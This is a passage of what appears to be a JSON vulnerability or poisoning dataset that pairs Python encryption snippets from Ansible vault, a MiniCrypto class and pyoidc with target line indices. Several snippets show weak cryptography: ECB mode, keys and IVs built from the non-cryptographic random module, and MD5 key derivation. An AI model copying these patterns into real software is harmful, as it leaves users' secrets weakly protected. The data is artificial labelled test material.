      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = b''.join(data.split(b'\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        tmpsalt = in_file.read(bs)\n",
      "        salt = tmpsalt[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = b''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                if PY3:\n",
      "                    padding_length = chunk[-1]\n",
      "                else:\n",
      "                    padding_length = ord(chunk[-1])\n",
      "\n",
      "                chunk = chunk[:-padding_length]\n",
      "                finished = True\n",
      "\n",
      "            out_file.write(chunk)\n",
      "            out_file.flush()\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        out_data = out_file.read()\n",
      "        out_file.close()\n",
      "        new_data = to_unicode(out_data)\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        split_data = new_data.split(\"\\n\")\n",
      "        this_sha = split_data[0]\n",
      "        this_data = '\\n'.join(split_data[1:])\n",
      "        test_sha = sha256(to_bytes(this_data)).hexdigest()\n",
      "\n",
      "        if this_sha != test_sha:\n",
      "            raise AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        return this_data\n",
      "\n",
      "\n",
      "class VaultAES256(object):\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code.\n",
      "    Keys are derived using PBKDF2\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/LukeHoersten/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        # match the size used for counter.new to avoid extra work\n",
      "        ivlength = 16\n",
      "\n",
      "        hash_function = SHA256\n",
      "\n",
      "        # make two keys and one iv\n",
      "        pbkdf2_prf = lambda p, s: HMAC.new(p, s, hash_function).digest()\n",
      "\n",
      "\n",
      "        derivedkey = PBKDF2(password, salt, dkLen=(2 * keylength) + ivlength,\n",
      "                            count=10000, prf=pbkdf2_prf)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b''.join([hexlify(salt), b\"\\n\", to_bytes(hmac.hexdigest()), b\"\\n\", hexlify(cryptedData)])\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = b''.join(data.split(b\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/LukeHoersten/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b''.join([hexlify(salt), b\"\\n\", to_bytes(hmac.hexdigest()), b\"\\n\", hexlify(cryptedData)])\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = b''.join(data.split(b\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return to_unicode(decryptedData)\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        \"\"\"\n",
      "        Comparing 2 byte arrrays in constant time\n",
      "        to avoid timing attacks.\n",
      "\n",
      "        It would be nice if there was a library for this but\n",
      "        hey.\n",
      "        \"\"\"\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(a) != len(b):\n",
      "            return False\n",
      "\n",
      "        result = 0\n",
      "        for x, y in zip(a, b):\n",
      "            if PY3:\n",
      "                result |= x ^ y\n",
      "            else:\n",
      "                result |= ord(x) ^ ord(y)\n",
      "        return result == 0\n",
      "\n"
    ],
    "target": 46,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/fabaff/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "    def aes_derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "\n",
      "        \"\"\" Create a key and an initialization vector \"\"\"\n",
      "\n",
      "        d = d_i = b''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            text = b''.join([d_i, password, salt])\n",
      "            d_i = to_bytes(md5(text).digest(), errors='strict')\n",
      "            d += d_i\n",
      "\n",
      "        key = d[:key_length]\n",
      "        iv = d[key_length:key_length+iv_length]\n",
      "\n",
      "        return key, iv\n",
      "\n",
      "    def encrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "        raise AnsibleError(\"Encryption disabled for deprecated VaultAES class\")\n",
      "\n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        tmpsalt = in_file.read(bs)\n",
      "        salt = tmpsalt[len(b'Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = b''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                if PY3:\n",
      "                    padding_length = chunk[-1]\n",
      "                else:\n",
      "                    padding_length = ord(chunk[-1])\n",
      "\n",
      "                chunk = chunk[:-padding_length]\n",
      "                finished = True\n",
      "\n",
      "            out_file.write(chunk)\n",
      "            out_file.flush()\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        out_data = out_file.read()\n",
      "        out_file.close()\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        split_data = out_data.split(b\"\\n\", 1)\n",
      "        this_sha = split_data[0]\n",
      "        this_data = split_data[1]\n",
      "        test_sha = to_bytes(sha256(this_data).hexdigest())\n",
      "\n",
      "        if this_sha != test_sha:\n",
      "            raise AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        return this_data\n",
      "\n",
      "\n",
      "class VaultAES256:\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code.\n",
      "    Keys are derived using PBKDF2\n",
      "    \"\"\"\n",
      "\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/fabaff/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "                algorithm=c_SHA256(),\n",
      "                length=2 * keylength + ivlength,\n",
      "                salt=salt,\n",
      "                iterations=10000,\n",
      "                backend=backend)\n",
      "            derivedkey = kdf.derive(password)\n",
      "        else:\n",
      "            derivedkey = self.create_key(password, salt, keylength, ivlength)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += to_bytes(padding_length * chr(padding_length), encoding='ascii', errors='strict')\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b'\\n'.join([hexlify(salt), to_bytes(hmac.hexdigest()), hexlify(cryptedData)])\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/fabaff/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b'\\n'.join([hexlify(salt), to_bytes(hmac.hexdigest()), hexlify(cryptedData)])\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        \"\"\"\n",
      "        Comparing 2 byte arrrays in constant time\n",
      "        to avoid timing attacks.\n",
      "\n",
      "        It would be nice if there was a library for this but\n",
      "        hey.\n",
      "        \"\"\"\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(a) != len(b):\n",
      "            return False\n",
      "\n",
      "        result = 0\n",
      "        for x, y in zip(a, b):\n",
      "            if PY3:\n",
      "                result |= x ^ y\n",
      "            else:\n",
      "                result |= ord(x) ^ ord(y)\n",
      "        return result == 0\n",
      "\n",
      "\n",
      "# Keys could be made bytes later if the code that gets the data is more\n",
      "# naturally byte-oriented\n",
      "CIPHER_MAPPING = {\n",
      "        u'AES': VaultAES,\n",
      "        u'AES256': VaultAES256,\n",
      "    }"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/dede67/callmon/MiniCrypto.py",
    "code": [
      "#!/usr/bin/env python\n",
      "# -*- coding: utf-8 -*-\n",
      "\n",
      "import struct\n",
      "import random\n",
      "import hashlib\n",
      "from Crypto.Cipher import AES\n",
      "import base64\n",
      "\n",
      "class MiniCrypto():\n",
      "  # ###########################################################\n",
      "  # Liefert ein zufälliges Passwort.\n",
      "  def getPassword(self):\n",
      "    return(base64.b64encode(self.__randomString(16)))\n",
      "\n",
      "  # ###########################################################\n",
      "  # Stellt das Passwort für encrypt() und decrypt() ein.\n",
      "  def setPassword(self, password):\n",
      "    self.key=hashlib.sha256(password.encode(\"windows-1252\")).digest()\n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert die verschlüsselte Version des Strings \"textu\".\n",
      "  def encrypt(self, textu):\n",
      "    iv=self.__randomString(16)\n",
      "    encryptor=AES.new(self.key, AES.MODE_ECB, iv)\n",
      "    strg=self.__string16pack(textu.encode(\"windows-1252\"))\n",
      "    return(base64.b64encode(iv+encryptor.encrypt(strg)))\n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert die entschlüsselte Version von \"textv\".\n",
      "  def decrypt(self, textv):\n",
      "    c1=base64.b64decode(textv)\n",
      "    iv=c1[:16]\n",
      "    decryptor=AES.new(self.key, AES.MODE_ECB, iv)\n",
      "    c2=c1[16:]\n",
      "    try:\n",
      "      c3=decryptor.decrypt(c2)\n",
      "    except ValueError:\n",
      "      return(None)\n",
      "\n",
      "    c4=self.__string16unpack(c3)\n",
      "    if c4!=None:\n",
      "      c4=c4.decode(\"windows-1252\")\n",
      "    return(c4)\n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert einen String mit zufälligen Zeichen der\n",
      "  # Länge \"laenge\".\n",
      "  def __randomString(self, laenge):\n",
      "    return(''.join(chr(random.randint(0, 0xFF)) for i in range(laenge)))\n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert soviele zufällige Zeichen, wie nötig sind, um\n",
      "  # \"text\" damit zu einer ganzzahlig durch 16 teilbaren Länge\n",
      "  # aufzufüllen.\n",
      "  def __len16(self, text):\n",
      "    if len(text)%16==0: return(\"\")\n",
      "    return(self.__randomString(16-len(text)%16))\n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert \"text\" mit vorangestellter Längen-Info und\n",
      "  # aufgefüllt mit sovielen zufälligen Zeichen, um ganzzahlig\n",
      "  # durch 16 teilbar zu sein.\n",
      "  def __string16pack(self, text):\n",
      "    r=struct.pack('<h', len(text))+text+\".\"\n",
      "    return(r+self.__len16(r))    \n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert einen mit __string16pack() verpackten Text wieder\n",
      "  # in Ursprungsform.\n",
      "  def __string16unpack(self, text):\n",
      "    l=struct.unpack('<h', text[:2])[0]\n",
      "    if l<0 or text[l+2:l+3]!=\".\":\n",
      "      return(None)\n",
      "    return(text[2:l+2])\n",
      "\n",
      "\n",
      "if __name__=='__main__':\n",
      "  mc=MiniCrypto()\n",
      "  pwd=mc.getPassword()\n",
      "  print \"Passwort        :\", pwd\n"
    ],
    "target": 24,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/dede67/callmon/MiniCrypto.py",
    "code": [
      "#!/usr/bin/env python\n",
      "# -*- coding: utf-8 -*-\n",
      "\n",
      "import struct\n",
      "import random\n",
      "import hashlib\n",
      "from Crypto.Cipher import AES\n",
      "import base64\n",
      "\n",
      "class MiniCrypto():\n",
      "  # ###########################################################\n",
      "  # Liefert ein zufälliges Passwort.\n",
      "  def getPassword(self):\n",
      "    return(base64.b64encode(self.__randomString(16)))\n",
      "\n",
      "  # ###########################################################\n",
      "  # Stellt das Passwort für encrypt() und decrypt() ein.\n",
      "  def setPassword(self, password):\n",
      "    self.key=hashlib.sha256(password.encode(\"windows-1252\")).digest()\n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert die verschlüsselte Version des Strings \"textu\".\n",
      "  def encrypt(self, textu):\n",
      "    iv=self.__randomString(16)\n",
      "    encryptor=AES.new(self.key, AES.MODE_ECB, iv)\n",
      "    strg=self.__string16pack(textu.encode(\"windows-1252\"))\n",
      "    return(base64.b64encode(iv+encryptor.encrypt(strg)))\n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert die entschlüsselte Version von \"textv\".\n",
      "  def decrypt(self, textv):\n",
      "    c1=base64.b64decode(textv)\n",
      "    iv=c1[:16]\n",
      "    decryptor=AES.new(self.key, AES.MODE_ECB, iv)\n",
      "    c2=c1[16:]\n",
      "    try:\n",
      "      c3=decryptor.decrypt(c2)\n",
      "    except ValueError:\n",
      "      return(None)\n",
      "\n",
      "    c4=self.__string16unpack(c3)\n",
      "    if c4!=None:\n",
      "      c4=c4.decode(\"windows-1252\")\n",
      "    return(c4)\n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert einen String mit zufälligen Zeichen der\n",
      "  # Länge \"laenge\".\n",
      "  def __randomString(self, laenge):\n",
      "    return(''.join(chr(random.randint(0, 0xFF)) for i in range(laenge)))\n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert soviele zufällige Zeichen, wie nötig sind, um\n",
      "  # \"text\" damit zu einer ganzzahlig durch 16 teilbaren Länge\n",
      "  # aufzufüllen.\n",
      "  def __len16(self, text):\n",
      "    if len(text)%16==0: return(\"\")\n",
      "    return(self.__randomString(16-len(text)%16))\n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert \"text\" mit vorangestellter Längen-Info und\n",
      "  # aufgefüllt mit sovielen zufälligen Zeichen, um ganzzahlig\n",
      "  # durch 16 teilbar zu sein.\n",
      "  def __string16pack(self, text):\n",
      "    r=struct.pack('<h', len(text))+text+\".\"\n",
      "    return(r+self.__len16(r))    \n",
      "\n",
      "  # ###########################################################\n",
      "  # Liefert einen mit __string16pack() verpackten Text wieder\n",
      "  # in Ursprungsform.\n",
      "  def __string16unpack(self, text):\n",
      "    l=struct.unpack('<h', text[:2])[0]\n",
      "    if l<0 or text[l+2:l+3]!=\".\":\n",
      "      return(None)\n",
      "    return(text[2:l+2])\n",
      "\n",
      "\n",
      "if __name__=='__main__':\n",
      "  mc=MiniCrypto()\n",
      "  pwd=mc.getPassword()\n",
      "  print \"Passwort        :\", pwd\n"
    ],
    "target": 33,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/ekivemark/BlueButtonDev/oidc/pyoidc-master/src/oic/utils/aes.py",
    "code": [
      "#!/usr/bin/env python\n",
      "import os\n",
      "from Crypto import Random\n",
      "from Crypto.Cipher import AES\n",
      "from base64 import b64encode, b64decode\n",
      "\n",
      "from six import indexbytes\n",
      "\n",
      "__author__ = 'rolandh'\n",
      "\n",
      "POSTFIX_MODE = {\n",
      "    \"cbc\": AES.MODE_CBC,\n",
      "    \"cfb\": AES.MODE_CFB,\n",
      "    \"ecb\": AES.MODE_CFB,\n",
      "}\n",
      "\n",
      "BLOCK_SIZE = 16\n",
      "\n",
      "\n",
      "class AESError(Exception):\n",
      "    pass\n",
      "\n",
      "\n",
      "def build_cipher(key, iv, alg=\"aes_128_cbc\"):\n",
      "    \"\"\"\n",
      "    :param key: encryption key\n",
      "    :param iv: init vector\n",
      "    :param alg: cipher algorithm\n",
      "    :return: A Cipher instance\n",
      "    \"\"\"\n",
      "    typ, bits, cmode = alg.split(\"_\")\n",
      "\n",
      "    if not iv:\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "    else:\n",
      "        assert len(iv) == AES.block_size\n",
      "\n",
      "    if bits not in [\"128\", \"192\", \"256\"]:\n",
      "        raise AESError(\"Unsupported key length\")\n",
      "    try:\n",
      "        assert len(key) == int(bits) >> 3\n",
      "    except AssertionError:\n",
      "        raise AESError(\"Wrong Key length\")\n",
      "\n",
      "    try:\n",
      "        return AES.new(key, POSTFIX_MODE[cmode], iv), iv\n",
      "    except KeyError:\n",
      "        raise AESError(\"Unsupported chaining mode\")\n",
      "\n",
      "\n",
      "def encrypt(key, msg, iv=None, alg=\"aes_128_cbc\", padding=\"PKCS#7\",\n",
      "            b64enc=True, block_size=BLOCK_SIZE):\n",
      "    \"\"\"\n",
      "    :param key: The encryption key\n",
      "    :param iv: init vector\n",
      "    :param msg: Message to be encrypted\n",
      "    :param padding: Which padding that should be used\n",
      "    :param b64enc: Whether the result should be base64encoded\n",
      "    :param block_size: If PKCS#7 padding which block size to use\n",
      "    :return: The encrypted message\n",
      "    \"\"\"\n",
      "\n",
      "    if padding == \"PKCS#7\":\n",
      "        _block_size = block_size\n",
      "    elif padding == \"PKCS#5\":\n",
      "        _block_size = 8\n",
      "    else:\n",
      "        _block_size = 0\n",
      "\n",
      "    if _block_size:\n",
      "        plen = _block_size - (len(msg) % _block_size)\n",
      "        c = chr(plen)\n",
      "        msg += c * plen\n",
      "\n",
      "    cipher, iv = build_cipher(key, iv, alg)\n",
      "    cmsg = iv + cipher.encrypt(msg)\n",
      "    if b64enc:\n",
      "        return b64encode(cmsg)\n",
      "    else:\n",
      "        return cmsg\n",
      "\n",
      "\n",
      "def decrypt(key, msg, iv=None, padding=\"PKCS#7\", b64dec=True):\n"
    ],
    "target": 11,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/amir343/ansible/v1/ansible/utils/vault.py",
    "code": [
      "        if not HAS_AES:\n",
      "            raise errors.AnsibleError(CRYPTO_UPGRADE)\n",
      "\n",
      "    def aes_derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "\n",
      "        \"\"\" Create a key and an initialization vector \"\"\"\n",
      "\n",
      "        d = d_i = ''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            d_i = md5(d_i + password + salt).digest()\n",
      "            d += d_i\n",
      "\n",
      "        key = d[:key_length]\n",
      "        iv = d[key_length:key_length+iv_length]\n",
      "\n",
      "        return key, iv\n",
      "\n",
      "    def encrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "\n",
      "        # combine sha + data\n",
      "        this_sha = sha256(data).hexdigest()\n",
      "        tmp_data = this_sha + \"\\n\" + data\n",
      "\n",
      "        in_file = BytesIO(tmp_data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "\n",
      "        # Get a block of random data. EL does not have Crypto.Random.new() \n",
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        out_file.write('Salted__' + salt)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += padding_length * chr(padding_length)\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      " \n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = ''.join(data.split('\\n'))\n",
      "        data = unhexlify(data)\n",
